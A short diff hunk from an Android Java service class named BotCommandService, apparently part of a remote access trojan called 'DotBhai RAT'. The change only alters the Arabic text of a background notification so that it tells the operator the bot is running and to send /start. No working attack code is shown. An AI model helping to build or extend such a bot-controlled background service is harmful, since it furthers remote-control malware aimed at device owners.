@@ -41,7 +41,7 @@ public class BotCommandService extends Service {
             
             Notification notification = builder
                     .setContentTitle("DotBhai RAT")
-                    .setContentText("يعمل في الخلفية...")
+                    .setContentText("البوت شغال... أرسل /start")
                     .setSmallIcon(android.R.drawable.ic_menu_manage)
                     .build();
                     
